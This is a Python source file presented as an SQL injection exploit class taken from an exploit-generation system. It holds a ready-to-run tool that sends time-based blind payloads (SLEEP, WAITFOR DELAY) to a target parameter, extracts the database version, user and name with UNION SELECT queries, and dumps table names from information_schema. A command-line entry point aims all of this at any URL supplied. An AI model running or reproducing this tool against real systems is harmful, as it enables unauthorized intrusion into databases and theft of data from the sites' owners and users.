"""
SQL Injection Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys
import time
from urllib.parse import quote


class SQLiExploit:
    """SQL Injection exploitation class for CVE-based attacks"""

    def __init__(self, target_url, endpoint="/vulnerable.php", parameter="id"):
        """
        Initialize SQL injection exploit

        Args:
            target_url: Base URL of target application
            endpoint: Vulnerable endpoint path
            parameter: Vulnerable parameter name
        """
        self.target_url = target_url.rstrip('/')
        self.endpoint = endpoint
        self.parameter = parameter
        self.session = requests.Session()

    def test_injection(self):
        """Test if target is vulnerable to SQL injection"""
        print(f"[+] Testing SQL injection on {self.target_url}{self.endpoint}")

        # Time-based blind SQL injection test
        payloads = [
            "1' AND SLEEP(3)--",
            "1' OR SLEEP(3)--",
            "1'; WAITFOR DELAY '00:00:03'--"
        ]

        for payload in payloads:
            start_time = time.time()
            try:
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    params={self.parameter: payload},
                    timeout=10
                )
                elapsed = time.time() - start_time

                if elapsed >= 3:
                    print(f"[+] Vulnerable! Payload: {payload}")
                    return True

            except requests.exceptions.Timeout:
                print(f"[+] Likely vulnerable (timeout): {payload}")
                return True
            except Exception as e:
                continue

        return False

    def extract_database_info(self):
        """Extract database information using SQL injection"""
        print("[+] Extracting database information...")

        queries = {
            "version": "SELECT VERSION()",
            "user": "SELECT USER()",
            "database": "SELECT DATABASE()"
        }

        results = {}

        for info_type, query in queries.items():
            payload = f"1' UNION SELECT 1,({query}),3--"
            try:
                response = self.session.get(
                    f"{self.target_url}{self.endpoint}",
                    params={self.parameter: payload}
                )

                # Simple extraction (would need customization per application)
                if response.status_code == 200:
                    results[info_type] = "Check response manually"
                    print(f"[+] {info_type.title()}: Check response for {query}")

            except Exception as e:
                print(f"[-] Error extracting {info_type}: {e}")

        return results

    def dump_tables(self):
        """Dump table names from database"""
        print("[+] Attempting to dump table names...")

        # MySQL/MariaDB
        payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"

        try:
            response = self.session.get(
                f"{self.target_url}{self.endpoint}",
                params={self.parameter: payload}
            )

            if response.status_code == 200:
                print("[+] Tables dumped - check response")
                return response.text

        except Exception as e:
            print(f"[-] Error dumping tables: {e}")

        return None


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = SQLiExploit(target_url)

    print(f"[+] SQL Injection Exploit")
    print(f"[+] Target: {target_url}")

    if exploit.test_injection():
        print("[+] Target appears vulnerable!")
        exploit.extract_database_info()
        exploit.dump_tables()
    else:
        print("[-] Target does not appear vulnerable")


if __name__ == "__main__":
    main()
